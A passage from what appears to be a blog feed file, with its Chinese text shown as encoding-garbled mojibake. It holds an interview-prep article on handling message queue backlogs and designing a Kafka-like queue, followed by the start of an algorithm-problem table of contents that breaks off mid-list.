æŒ‚äº†ï¼Œæ¶ˆè´¹ç«¯ hang é‚£å„¿äº†ï¼Œä¸åŠ¨äº†ï¼›æˆ–è€…æ˜¯æ¶ˆè´¹ç«¯å‡ºäº†ä¸ªä»€ä¹ˆå²”å­ï¼Œå¯¼è‡´æ¶ˆè´¹é€Ÿåº¦æå…¶æ…¢ã€‚</p><h2><span id="é¢è¯•é¢˜å‰–æ">é¢è¯•é¢˜å‰–æ</span></h2><p>å…³äºè¿™ä¸ªäº‹å„¿ï¼Œæˆ‘ä»¬ä¸€ä¸ªä¸€ä¸ªæ¥æ¢³ç†å§ï¼Œå…ˆå‡è®¾ä¸€ä¸ªåœºæ™¯ï¼Œæˆ‘ä»¬ç°åœ¨æ¶ˆè´¹ç«¯å‡ºæ•…éšœäº†ï¼Œç„¶åå¤§é‡æ¶ˆæ¯åœ¨ mq é‡Œç§¯å‹ï¼Œç°åœ¨å‡ºäº‹æ•…äº†ï¼Œæ…Œäº†ã€‚</p><h3><span id="å¤§é‡æ¶ˆæ¯åœ¨-mq-é‡Œç§¯å‹äº†å‡ ä¸ªå°æ—¶äº†è¿˜æ²¡è§£å†³">å¤§é‡æ¶ˆæ¯åœ¨ mq é‡Œç§¯å‹äº†å‡ ä¸ªå°æ—¶äº†è¿˜æ²¡è§£å†³</span></h3><p>å‡ åƒä¸‡æ¡æ•°æ®åœ¨ MQ é‡Œç§¯å‹äº†ä¸ƒå…«ä¸ªå°æ—¶ï¼Œä»ä¸‹åˆ 4 ç‚¹å¤šï¼Œç§¯å‹åˆ°äº†æ™šä¸Š 11 ç‚¹å¤šã€‚è¿™ä¸ªæ˜¯æˆ‘ä»¬çœŸå®é‡åˆ°è¿‡çš„ä¸€ä¸ªåœºæ™¯ï¼Œç¡®å®æ˜¯çº¿ä¸Šæ•…éšœäº†ï¼Œè¿™ä¸ªæ—¶å€™è¦ä¸ç„¶å°±æ˜¯ä¿®å¤ consumer çš„é—®é¢˜ï¼Œè®©å®ƒæ¢å¤æ¶ˆè´¹é€Ÿåº¦ï¼Œç„¶åå‚»å‚»çš„ç­‰å¾…å‡ ä¸ªå°æ—¶æ¶ˆè´¹å®Œæ¯•ã€‚è¿™ä¸ªè‚¯å®šä¸èƒ½åœ¨é¢è¯•çš„æ—¶å€™è¯´å§ã€‚</p><p>ä¸€ä¸ªæ¶ˆè´¹è€…ä¸€ç§’æ˜¯ 1000 æ¡ï¼Œä¸€ç§’ 3 ä¸ªæ¶ˆè´¹è€…æ˜¯ 3000 æ¡ï¼Œä¸€åˆ†é’Ÿå°±æ˜¯ 18 ä¸‡æ¡ã€‚æ‰€ä»¥å¦‚æœä½ ç§¯å‹äº†å‡ ç™¾ä¸‡åˆ°ä¸Šåƒä¸‡çš„æ•°æ®ï¼Œå³ä½¿æ¶ˆè´¹è€…æ¢å¤äº†ï¼Œä¹Ÿéœ€è¦å¤§æ¦‚ 1 å°æ—¶çš„æ—¶é—´æ‰èƒ½æ¢å¤è¿‡æ¥ã€‚</p><p>ä¸€èˆ¬è¿™ä¸ªæ—¶å€™ï¼Œåªèƒ½ä¸´æ—¶ç´§æ€¥æ‰©å®¹äº†ï¼Œå…·ä½“æ“ä½œæ­¥éª¤å’Œæ€è·¯å¦‚ä¸‹ï¼š</p><ul><li>å…ˆä¿®å¤ consumer çš„é—®é¢˜ï¼Œç¡®ä¿å…¶æ¢å¤æ¶ˆè´¹é€Ÿåº¦ï¼Œç„¶åå°†ç°æœ‰ consumer éƒ½åœæ‰ã€‚</li><li>æ–°å»ºä¸€ä¸ª topicï¼Œpartition æ˜¯åŸæ¥çš„ 10 å€ï¼Œä¸´æ—¶å»ºç«‹å¥½åŸå…ˆ 10 å€çš„ queue æ•°é‡ã€‚</li><li>ç„¶åå†™ä¸€ä¸ªä¸´æ—¶çš„åˆ†å‘æ•°æ®çš„ consumer ç¨‹åºï¼Œè¿™ä¸ªç¨‹åºéƒ¨ç½²ä¸Šå»æ¶ˆè´¹ç§¯å‹çš„æ•°æ®ï¼Œ<strong>æ¶ˆè´¹ä¹‹åä¸åšè€—æ—¶çš„å¤„ç†</strong>ï¼Œç›´æ¥å‡åŒ€è½®è¯¢å†™å…¥ä¸´æ—¶å»ºç«‹å¥½çš„ 10 å€æ•°é‡çš„ queueã€‚</li><li>æ¥ç€ä¸´æ—¶å¾ç”¨ 10 å€çš„æœºå™¨æ¥éƒ¨ç½² consumerï¼Œæ¯ä¸€æ‰¹ consumer æ¶ˆè´¹ä¸€ä¸ªä¸´æ—¶ queue çš„æ•°æ®ã€‚è¿™ç§åšæ³•ç›¸å½“äºæ˜¯ä¸´æ—¶å°† queue èµ„æºå’Œ consumer èµ„æºæ‰©å¤§ 10 å€ï¼Œä»¥æ­£å¸¸çš„ 10 å€é€Ÿåº¦æ¥æ¶ˆè´¹æ•°æ®ã€‚</li><li>ç­‰å¿«é€Ÿæ¶ˆè´¹å®Œç§¯å‹æ•°æ®ä¹‹åï¼Œ<strong>å¾—æ¢å¤åŸå…ˆéƒ¨ç½²çš„æ¶æ„</strong>ï¼Œ<strong>é‡æ–°</strong>ç”¨åŸå…ˆçš„ consumer æœºå™¨æ¥æ¶ˆè´¹æ¶ˆæ¯ã€‚</li></ul><h3><span id="mq-ä¸­çš„æ¶ˆæ¯è¿‡æœŸå¤±æ•ˆäº†">mq ä¸­çš„æ¶ˆæ¯è¿‡æœŸå¤±æ•ˆäº†</span></h3><p>å‡è®¾ä½ ç”¨çš„æ˜¯ RabbitMQï¼ŒRabbtiMQ æ˜¯å¯ä»¥è®¾ç½®è¿‡æœŸæ—¶é—´çš„ï¼Œä¹Ÿå°±æ˜¯ TTLã€‚å¦‚æœæ¶ˆæ¯åœ¨ queue ä¸­ç§¯å‹è¶…è¿‡ä¸€å®šçš„æ—¶é—´å°±ä¼šè¢« RabbitMQ ç»™æ¸…ç†æ‰ï¼Œè¿™ä¸ªæ•°æ®å°±æ²¡äº†ã€‚é‚£è¿™å°±æ˜¯ç¬¬äºŒä¸ªå‘äº†ã€‚è¿™å°±ä¸æ˜¯è¯´æ•°æ®ä¼šå¤§é‡ç§¯å‹åœ¨ mq é‡Œï¼Œè€Œæ˜¯<strong>å¤§é‡çš„æ•°æ®ä¼šç›´æ¥æä¸¢</strong>ã€‚</p><p>è¿™ä¸ªæƒ…å†µä¸‹ï¼Œå°±ä¸æ˜¯è¯´è¦å¢åŠ  consumer æ¶ˆè´¹ç§¯å‹çš„æ¶ˆæ¯ï¼Œå› ä¸ºå®é™…ä¸Šæ²¡å•¥ç§¯å‹ï¼Œè€Œæ˜¯ä¸¢äº†å¤§é‡çš„æ¶ˆæ¯ã€‚æˆ‘ä»¬å¯ä»¥é‡‡å–ä¸€ä¸ªæ–¹æ¡ˆï¼Œå°±æ˜¯<strong>æ‰¹é‡é‡å¯¼</strong>ï¼Œè¿™ä¸ªæˆ‘ä»¬ä¹‹å‰çº¿ä¸Šä¹Ÿæœ‰ç±»ä¼¼çš„åœºæ™¯å¹²è¿‡ã€‚å°±æ˜¯å¤§é‡ç§¯å‹çš„æ—¶å€™ï¼Œæˆ‘ä»¬å½“æ—¶å°±ç›´æ¥ä¸¢å¼ƒæ•°æ®äº†ï¼Œç„¶åç­‰è¿‡äº†é«˜å³°æœŸä»¥åï¼Œæ¯”å¦‚å¤§å®¶ä¸€èµ·å–å’–å•¡ç†¬å¤œåˆ°æ™šä¸Š12ç‚¹ä»¥åï¼Œç”¨æˆ·éƒ½ç¡è§‰äº†ã€‚è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±å¼€å§‹å†™ç¨‹åºï¼Œå°†ä¸¢å¤±çš„é‚£æ‰¹æ•°æ®ï¼Œå†™ä¸ªä¸´æ—¶ç¨‹åºï¼Œä¸€ç‚¹ä¸€ç‚¹çš„æŸ¥å‡ºæ¥ï¼Œç„¶åé‡æ–°çŒå…¥ mq é‡Œé¢å»ï¼ŒæŠŠç™½å¤©ä¸¢çš„æ•°æ®ç»™ä»–è¡¥å›æ¥ã€‚ä¹Ÿåªèƒ½æ˜¯è¿™æ ·äº†ã€‚</p><p>å‡è®¾ 1 ä¸‡ä¸ªè®¢å•ç§¯å‹åœ¨ mq é‡Œé¢ï¼Œæ²¡æœ‰å¤„ç†ï¼Œå…¶ä¸­ 1000 ä¸ªè®¢å•éƒ½ä¸¢äº†ï¼Œä½ åªèƒ½æ‰‹åŠ¨å†™ç¨‹åºæŠŠé‚£ 1000 ä¸ªè®¢å•ç»™æŸ¥å‡ºæ¥ï¼Œæ‰‹åŠ¨å‘åˆ° mq é‡Œå»å†è¡¥ä¸€æ¬¡ã€‚</p><h3><span id="mq-éƒ½å¿«å†™æ»¡äº†">mq éƒ½å¿«å†™æ»¡äº†</span></h3><p>å¦‚æœæ¶ˆæ¯ç§¯å‹åœ¨ mq é‡Œï¼Œä½ å¾ˆé•¿æ—¶é—´éƒ½æ²¡æœ‰å¤„ç†æ‰ï¼Œæ­¤æ—¶å¯¼è‡´ mq éƒ½å¿«å†™æ»¡äº†ï¼Œå’‹åŠï¼Ÿè¿™ä¸ªè¿˜æœ‰åˆ«çš„åŠæ³•å—ï¼Ÿæ²¡æœ‰ï¼Œè°è®©ä½ ç¬¬ä¸€ä¸ªæ–¹æ¡ˆæ‰§è¡Œçš„å¤ªæ…¢äº†ï¼Œä½ ä¸´æ—¶å†™ç¨‹åºï¼Œæ¥å…¥æ•°æ®æ¥æ¶ˆè´¹ï¼Œ<strong>æ¶ˆè´¹ä¸€ä¸ªä¸¢å¼ƒä¸€ä¸ªï¼Œéƒ½ä¸è¦äº†</strong>ï¼Œå¿«é€Ÿæ¶ˆè´¹æ‰æ‰€æœ‰çš„æ¶ˆæ¯ã€‚ç„¶åèµ°ç¬¬äºŒä¸ªæ–¹æ¡ˆï¼Œåˆ°äº†æ™šä¸Šå†è¡¥æ•°æ®å§ã€‚</p><h1><span id="å¦‚æœè®©ä½ å†™ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—è¯¥å¦‚ä½•è¿›è¡Œæ¶æ„è®¾è®¡è¯´ä¸€ä¸‹ä½ çš„æ€è·¯">å¦‚æœè®©ä½ å†™ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ï¼Œè¯¥å¦‚ä½•è¿›è¡Œæ¶æ„è®¾è®¡ï¼Ÿè¯´ä¸€ä¸‹ä½ çš„æ€è·¯ã€‚</span></h1><h2><span id="é¢è¯•å®˜å¿ƒç†åˆ†æ">é¢è¯•å®˜å¿ƒç†åˆ†æ</span></h2><p>å…¶å®èŠåˆ°è¿™ä¸ªé—®é¢˜ï¼Œä¸€èˆ¬é¢è¯•å®˜è¦è€ƒå¯Ÿä¸¤å—ï¼š</p><ul><li>ä½ æœ‰æ²¡æœ‰å¯¹æŸä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—åšè¿‡è¾ƒä¸ºæ·±å…¥çš„åŸç†çš„äº†è§£ï¼Œæˆ–è€…ä»æ•´ä½“äº†è§£æŠŠæ¡ä½ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—çš„æ¶æ„åŸç†ã€‚</li><li>çœ‹çœ‹ä½ çš„è®¾è®¡èƒ½åŠ›ï¼Œç»™ä½ ä¸€ä¸ªå¸¸è§çš„ç³»ç»Ÿï¼Œå°±æ˜¯æ¶ˆæ¯é˜Ÿåˆ—ç³»ç»Ÿï¼Œçœ‹çœ‹ä½ èƒ½ä¸èƒ½ä»å…¨å±€æŠŠæ¡ä¸€ä¸‹æ•´ä½“æ¶æ„è®¾è®¡ï¼Œç»™å‡ºä¸€äº›å…³é”®ç‚¹å‡ºæ¥ã€‚</li></ul><p>è¯´å®è¯ï¼Œé—®ç±»ä¼¼é—®é¢˜çš„æ—¶å€™ï¼Œå¤§éƒ¨åˆ†äººåŸºæœ¬éƒ½ä¼šè’™ï¼Œå› ä¸ºå¹³æ—¶ä»æ¥æ²¡æœ‰æ€è€ƒè¿‡ç±»ä¼¼çš„é—®é¢˜ï¼Œ<strong>å¤§å¤šæ•°äººå°±æ˜¯å¹³æ—¶åŸ‹å¤´ç”¨ï¼Œä»æ¥ä¸å»æ€è€ƒèƒŒåçš„ä¸€äº›ä¸œè¥¿</strong>ã€‚ç±»ä¼¼çš„é—®é¢˜ï¼Œæ¯”å¦‚ï¼Œå¦‚æœè®©ä½ æ¥è®¾è®¡ä¸€ä¸ª Spring æ¡†æ¶ä½ ä¼šæ€ä¹ˆåšï¼Ÿå¦‚æœè®©ä½ æ¥è®¾è®¡ä¸€ä¸ª Dubbo æ¡†æ¶ä½ ä¼šæ€ä¹ˆåšï¼Ÿå¦‚æœè®©ä½ æ¥è®¾è®¡ä¸€ä¸ª MyBatis æ¡†æ¶ä½ ä¼šæ€ä¹ˆåšï¼Ÿ</p><h2><span id="é¢è¯•é¢˜å‰–æ">é¢è¯•é¢˜å‰–æ</span></h2><p>å…¶å®å›ç­”è¿™ç±»é—®é¢˜ï¼Œè¯´ç™½äº†ï¼Œä¸æ±‚ä½ çœ‹è¿‡é‚£æŠ€æœ¯çš„æºç ï¼Œèµ·ç ä½ è¦å¤§æ¦‚çŸ¥é“é‚£ä¸ªæŠ€æœ¯çš„åŸºæœ¬åŸç†ã€æ ¸å¿ƒç»„æˆéƒ¨åˆ†ã€åŸºæœ¬æ¶æ„æ„æˆï¼Œç„¶åå‚ç…§ä¸€äº›å¼€æºçš„æŠ€æœ¯æŠŠä¸€ä¸ªç³»ç»Ÿè®¾è®¡å‡ºæ¥çš„æ€è·¯è¯´ä¸€ä¸‹å°±å¥½ã€‚</p><p>æ¯”å¦‚è¯´è¿™ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ç³»ç»Ÿï¼Œæˆ‘ä»¬ä»ä»¥ä¸‹å‡ ä¸ªè§’åº¦æ¥è€ƒè™‘ä¸€ä¸‹ï¼š</p><ul><li><p>é¦–å…ˆè¿™ä¸ª mq å¾—æ”¯æŒå¯ä¼¸ç¼©æ€§å§ï¼Œå°±æ˜¯éœ€è¦çš„æ—¶å€™å¿«é€Ÿæ‰©å®¹ï¼Œå°±å¯ä»¥å¢åŠ ååé‡å’Œå®¹é‡ï¼Œé‚£æ€ä¹ˆæï¼Ÿè®¾è®¡ä¸ªåˆ†å¸ƒå¼çš„ç³»ç»Ÿå‘—ï¼Œå‚ç…§ä¸€ä¸‹ kafka çš„è®¾è®¡ç†å¿µï¼Œbroker -&gt; topic -&gt; partitionï¼Œæ¯ä¸ª partition æ”¾ä¸€ä¸ªæœºå™¨ï¼Œå°±å­˜ä¸€éƒ¨åˆ†æ•°æ®ã€‚å¦‚æœç°åœ¨èµ„æºä¸å¤Ÿäº†ï¼Œç®€å•å•Šï¼Œç»™ topic å¢åŠ  partitionï¼Œç„¶ååšæ•°æ®è¿ç§»ï¼Œå¢åŠ æœºå™¨ï¼Œä¸å°±å¯ä»¥å­˜æ”¾æ›´å¤šæ•°æ®ï¼Œæä¾›æ›´é«˜çš„ååé‡äº†ï¼Ÿ</p></li><li><p>å…¶æ¬¡ä½ å¾—è€ƒè™‘ä¸€ä¸‹è¿™ä¸ª mq çš„æ•°æ®è¦ä¸è¦è½åœ°ç£ç›˜å§ï¼Ÿé‚£è‚¯å®šè¦äº†ï¼Œè½ç£ç›˜æ‰èƒ½ä¿è¯åˆ«è¿›ç¨‹æŒ‚äº†æ•°æ®å°±ä¸¢äº†ã€‚é‚£è½ç£ç›˜çš„æ—¶å€™æ€ä¹ˆè½å•Šï¼Ÿé¡ºåºå†™ï¼Œè¿™æ ·å°±æ²¡æœ‰ç£ç›˜éšæœºè¯»å†™çš„å¯»å€å¼€é”€ï¼Œç£ç›˜é¡ºåºè¯»å†™çš„æ€§èƒ½æ˜¯å¾ˆé«˜çš„ï¼Œè¿™å°±æ˜¯ kafka çš„æ€è·¯ã€‚</p></li><li><p>å…¶æ¬¡ä½ è€ƒè™‘ä¸€ä¸‹ä½ çš„ mq çš„å¯ç”¨æ€§å•Šï¼Ÿè¿™ä¸ªäº‹å„¿ï¼Œå…·ä½“å‚è€ƒä¹‹å‰å¯ç”¨æ€§é‚£ä¸ªç¯èŠ‚è®²è§£çš„ kafka çš„é«˜å¯ç”¨ä¿éšœæœºåˆ¶ã€‚å¤šå‰¯æœ¬ -&gt; leader &amp; follower -&gt; broker æŒ‚äº†é‡æ–°é€‰ä¸¾ leader å³å¯å¯¹å¤–æœåŠ¡ã€‚</p></li><li><p>èƒ½ä¸èƒ½æ”¯æŒæ•°æ® 0 ä¸¢å¤±å•Šï¼Ÿå¯ä»¥çš„ï¼Œå‚è€ƒæˆ‘ä»¬ä¹‹å‰è¯´çš„é‚£ä¸ª kafka æ•°æ®é›¶ä¸¢å¤±æ–¹æ¡ˆã€‚</p></li></ul><p>mq è‚¯å®šæ˜¯å¾ˆå¤æ‚çš„ï¼Œé¢è¯•å®˜é—®ä½ è¿™ä¸ªé—®é¢˜ï¼Œå…¶å®æ˜¯ä¸ªå¼€æ”¾é¢˜ï¼Œä»–å°±æ˜¯çœ‹çœ‹ä½ æœ‰æ²¡æœ‰ä»æ¶æ„è§’åº¦æ•´ä½“æ„æ€å’Œè®¾è®¡çš„æ€ç»´ä»¥åŠèƒ½åŠ›ã€‚ç¡®å®è¿™ä¸ªé—®é¢˜å¯ä»¥åˆ·æ‰ä¸€å¤§æ‰¹äººï¼Œå› ä¸ºå¤§éƒ¨åˆ†äººå¹³æ—¶ä¸æ€è€ƒè¿™äº›ä¸œè¥¿ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> é¢è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¶ˆæ¯é˜Ÿåˆ— </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å‰‘æŒ‡Offer</title>
      <link href="/2020/04/07/%E5%89%91%E6%8C%87OFFER/"/>
      <url>/2020/04/07/%E5%89%91%E6%8C%87OFFER/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>ç‰›å®¢ç½‘</p><span id="more"></span><!-- toc --><ul><li><a href="#%E6%95%B0%E7%BB%84">æ•°ç»„</a><ul><li><a href="#%E6%9E%84%E5%BB%BA%E4%B9%98%E7%A7%AF%E6%95%B0%E7%BB%84-">æ„å»ºä¹˜ç§¯æ•°ç»„ -âˆš</a></li><li><a href="#%E6%95%B0%E7%BB%84%E4%B8%AD%E9%87%8D%E5%A4%8D%E7%9A%84%E6%95%B0%E5%AD%97">æ•°ç»„ä¸­é‡å¤çš„æ•°å­— âˆš</a></li><li><a href="#%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84%E7%9A%84%E6%9F%A5%E6%89%BE">äºŒç»´æ•°ç»„çš„æŸ¥æ‰¾ âˆš</a></li><li><a href="#%E8%A1%A8%E7%A4%BA%E6%95%B0%E5%80%BC%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2-">è¡¨ç¤ºæ•°å€¼çš„å­—ç¬¦ä¸² -</a></li><li><a href="#%E5%92%8C%E4%B8%BAs%E7%9A%84%E4%B8%A4%E4%B8%AA%E6%95%B0%E5%AD%97">å’Œä¸ºSçš„ä¸¤ä¸ªæ•°å­— âˆš</a></li><li><a href="#%E5%92%8C%E4%B8%BAs%E7%9A%84%E8%BF%9E%E7%BB%AD%E6%AD%A3%E6%95%B0%E5%BA%8F%E5%88%97">å’Œä¸ºSçš„è¿ç»­æ­£æ•°åºåˆ— âˆš</a></li><li><a href="#%E6%89%91%E5%85%8B%E7%89%8C%E9%A1%BA%E5%AD%90">æ‰‘å…‹ç‰Œé¡ºå­ âˆš</a></li><li><a href="#%E8%B0%83%E6%95%B4%E6%95%B0%E7%BB%84%E9%A1%BA%E5%BA%8F%E4%BD%BF%E5%A5%87%E6%95%B0%E4%BD%8D%E4%BA%8E%E5%81%B6%E6%95%B0%E5%89%8D%E9%9D%A2">è°ƒæ•´æ•°ç»„é¡ºåºä½¿å¥‡æ•°ä½äºå¶æ•°å‰é¢ âˆš</a></li><li><a href="#%E6%95%B0%E5%AD%97%E5%9C%A8%E6%8E%92%E5%BA%8F%E6%95%B0%E7%BB%84%E4%B8%AD%E5%87%BA%E7%8E%B0%E7%9A%84%E6%AC%A1%E6%95%B0">æ•°å­—åœ¨æ’åºæ•°ç»„ä¸­å‡ºç°çš„æ¬¡æ•° âˆš</a></li><li><a href="#%E6%9C%80%E5%B0%8F%E7%9A%84k%E4%B8%AA%E6%95%B0-">æœ€å°çš„kä¸ªæ•° -âˆš</a></li><li><a href="#%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84%E9%80%86%E5%BA%8F%E5%AF%B9-">æ•°ç»„ä¸­çš„é€†åºå¯¹ -</a></li><li><a href="#%E6%95%B0%E7%BB%84%E4%B8%AD%E5%87%BA%E7%8E%B0%E6%AC%A1%E6%95%B0%E8%B6%85%E8%BF%87%E4%B8%80%E5%8D%8A%E7%9A%84%E6%95%B0%E5%AD%97">æ•°ç»„ä¸­å‡ºç°æ¬¡æ•°è¶…è¿‡ä¸€åŠçš„æ•°å­— Ã—</a></li><li><a href="#%E9%A1%BA%E6%97%B6%E9%92%88%E6%89%93%E5%8D%B0%E7%9F%A9%E9%98%B5">é¡ºæ—¶é’ˆæ‰“å°çŸ©é˜µ Ã—</a></li></ul></li><li><a href="#%E5%AD%97%E7%AC%A6%E4%B8%B2">å­—ç¬¦ä¸²</a><ul><li><a href="#%E6%9B%BF%E6%8D%A2%E7%A9%BA%E6%A0%BC">æ›¿æ¢ç©ºæ ¼ âˆš</a></li><li><a href="#%E5%B7%A6%E6%97%8B%E8%BD%AC%E5%AD%97%E7%AC%A6%E4%B8%B2">å·¦æ—‹è½¬å­—ç¬¦ä¸² âˆš</a></li><li><a href="#%E7%BF%BB%E8%BD%AC%E5%8D%95%E8%AF%8D%E9%A1%BA%E5%BA%8F%E5%88%97">ç¿»è½¬å•è¯é¡ºåºåˆ— âˆš</a></li><li><a href="#%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8F%AA%E5%87%BA%E7%8E%B0%E4%B8%80%E6%AC%A1%E7%9A%84%E5%AD%97%E7%AC%A6">ç¬¬ä¸€ä¸ªåªå‡ºç°ä¸€æ¬¡çš„å­—ç¬¦ âˆš</a></li><li><a href="#%E6%8A%8A%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%AC%E5%8C%96%E6%88%90%E6%95%B4%E6%95%B0">æŠŠå­—ç¬¦ä¸²è½¬åŒ–æˆæ•´æ•° âˆš</a></li><li><a href="#%E6%8A%8A%E6%95%B0%E7%BB%84%E6%8E%92%E6%88%90%E6%9C%80%E5%B0%8F%E7%9A%84%E6%95%B0-">æŠŠæ•°ç»„æ’æˆæœ€å°çš„æ•° -</a></li></ul></li><li><a href="#%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92">åŠ¨æ€è§„åˆ’</a><ul><li><a href="#%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%8C%B9%E9%85%8D-">æ­£åˆ™è¡¨è¾¾å¼åŒ¹é… -</a></li><li><a href="#%E8%B7%B3%E5%8F%B0%E9%98%B6">è·³å°é˜¶ âˆš</a></li><li><a href="#%E5%8F%98%E6%80%81%E8%B7%B3%E5%8F%B0%E9%98%B6">å˜æ€è·³å°é˜¶ âˆš</a></li><li><a href="#%E5%89%AA%E7%BB%B3%E5%AD%90">å‰ªç»³å­ âˆš</a></li><li><a href="#%E6%96%90%E6%B3%A2%E9%82%A3%E5%A5%91">æ–æ³¢é‚£å¥‘ âˆš</a></li><li><a href="#%E7%9F%A9%E5%BD%A2%E8%A6%86%E7%9B%96">çŸ©å½¢è¦†ç›– âˆš</a></li><li><a href="#%E8%BF%9E%E7%BB%AD%E6%95%B0%E7%BB%84%E7%9A%84%E6%9C%80%E5%A4%A7%E5%92%8C">è¿ç»­æ•°ç»„çš„æœ€å¤§å’Œ âˆš</a></li><li><a href="#%E4%B8%91%E6%95%B0">ä¸‘æ•° Ã—</a></li><li><a href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E6%8E%92%E5%88%97-">å­—ç¬¦ä¸²çš„æ’åˆ— -</a></li></ul></li><li><a href="#%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97">æ ˆå’Œé˜Ÿåˆ—</a><ul><li><a href="#%E5%AD%97%E7%AC%A6%E6%B5%81%E4%B8%AD%E7%AC%AC%E4%B8%80%E4%B8%AA%E4%B8%8D%E9%87%8D%E5%A4%8D%E7%9A%84%E5%AD%97%E7%AC%A6">å­—ç¬¦æµä¸­ç¬¬ä¸€ä¸ªä¸é‡å¤çš„å­—ç¬¦ âˆš</a></li><li><a href="#%E4%BB%8E%E5%B0%BE%E5%88%B0%E5%A4%B4%E6%89%93%E5%8D%B0%E9%93%BE%E8%A1%A8">ä»å°¾åˆ°å¤´æ‰“å°é“¾è¡¨ âˆš</a></li><li><a href="#%E5%8C%85%E5%90%ABmin%E5%87%BD%E6%95%B0%E7%9A%84%E6%A0%88">åŒ…å«minå‡½æ•°çš„æ ˆ âˆš</a></li><li><a href="#%E6%A0%88%E7%9A%84%E5%8E%8B%E5%85%A5%E5%BC%B9%E5%87%BA%E5%BA%8F%E5%88%97">æ ˆçš„å‹å…¥å¼¹å‡ºåºåˆ— âˆš</a></li></ul></li><li><a href="#%E9%93%BE%E8%A1%A8">é“¾è¡¨</a><ul><li><a href="#%E9%93%BE%E8%A1%A8%E4%B8%AD%E7%8E%AF%E7%9A%84%E5%85%A5%E5%8F%A3%E7%BB%93%E7%82%B9">é“¾è¡¨ä¸­ç¯çš„å…¥å£ç»“ç‚¹ âˆš</a></li><li><a href="#%E5%88%A0%E9%99%A4%E9%93%BE%E8%A1%A8%E4%B8%AD%E9%87%8D%E5%A4%8D%E7%9A%84%E7%BB%93%E7%82%B9-">åˆ é™¤é“¾è¡¨ä¸­é‡å¤çš„ç»“ç‚¹ -</a></li><li><a href="#%E5%90%88%E5%B9%B6%E4%B8%A4%E4%B8%AA%E6%8E%92%E5%BA%8F%E7%9A%84%E9%93%BE%E8%A1%A8">åˆå¹¶ä¸¤ä¸ªæ’åºçš„é“¾è¡¨ âˆš</a></li><li><a href="#%E9%93%BE%E8%A1%A8%E4%B8%AD%E5%80%92%E6%95%B0%E7%AC%ACk%E4%B8%AA%E7%BB%93%E7%82%B9">é“¾è¡¨ä¸­å€’æ•°ç¬¬kä¸ªç»“ç‚¹ âˆš</a></li><li><a href="#%E5%8F%8D%E8%BD%AC%E9%93%BE%E8%A1%A8">åè½¬é“¾è¡¨ âˆš</a></li><li><a href="#%E5%A4%8D%E6%9D%82%E9%93%BE%E8%A1%A8%E7%9A%84%E5%A4%8D%E5%88%B6">å¤æ‚é“¾è¡¨çš„å¤åˆ¶ âˆš</a></li></ul></li><li><a href="#%E6%A0%91">æ ‘</a><ul><li><a href="#%E9%87%8D%E5%BB%BA%E4%BA%8C%E5%8F%89%E6%A0%91">é‡å»ºäºŒå‰æ ‘ âˆš</a></li><li><a href="#%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E9%95%9C%E8%B1%A1">äºŒå‰æ ‘çš„é•œè±¡ âˆš</a></li><li><a href="#%E4%BB%8E%E4%B8%8A%E5%88%B0%E4%B8%8B%E6%89%93%E5%8D%B0%E4%BA%8C%E5%8F%89%E6%A0%91">ä»ä¸Šåˆ°ä¸‹æ‰“å°äºŒå‰æ ‘ âˆš</a></li><li><a href="#%E6%8C%89%E4%B9%8B%E5%AD%97%E5%BD%A2%E9%A1%BA%E5%BA%8F%E6%89%93%E5%8D%B0%E4%BA%8C%E5%8F%89%E6%A0%91">æŒ‰ä¹‹å­—å½¢é¡ºåºæ‰“å°äºŒå‰æ ‘ âˆš</a></li><li><a href="#%E5%AF%B9%E7%A7%B0%E7%9A%84%E4%BA%8C%E5%8F%89%E6%A0%91">å¯¹ç§°çš„äºŒå‰æ ‘ âˆš</a></li><li><a href="#%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%B7%B1%E5%BA%A6">äºŒå‰æ ‘çš„æ·±åº¦ âˆš</a></li><li><a href="#%E5%BA%8F%E5%88%97%E5%8C%96%E4%BA%8C%E5%8F%89%E6%A0%91-">åºåˆ—åŒ–äºŒå‰æ ‘ -</a></li><li><a href="#%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E7%9A%84%E7%AC%ACk%E4%B8%AA%E7%BB%93%E7%82%B9">äºŒå‰æœç´¢æ ‘çš„ç¬¬kä¸ªç»“ç‚¹ âˆš</a></li><li><a href="#%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E4%B8%8B%E4%B8%80%E4%B8%AA%E7%BB%93%E7%82%B9-">äºŒå‰æ ‘çš„ä¸‹ä¸€ä¸ªç»“ç‚¹ -</a></li><li><a href="#%E6%A0%91%E7%9A%84%E5%AD%90%E7%BB%93%E6%9E%84">æ ‘çš„å­ç»“æ„ âˆš</a></li><li><a href="#%E4%BA%8C%E5%8F%89%E6%A0%91%E4%B8%AD%E5%92%8C%E4%B8%BA%E6%9F%90%E4%B8%80%E5%80%BC%E7%9A%84%E8%B7%AF%E5%BE%84">äºŒå‰æ ‘ä¸­å’Œä¸ºæŸä¸€å€¼çš„è·¯å¾„ âˆš</a></li><li><a href="#%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E5%92%8C%E5%8F%8C%E5%90%91%E9%93%BE%E8%A1%A8-">äºŒå‰æœç´¢æ ‘å’ŒåŒå‘é“¾è¡¨ -</a></li><li><a 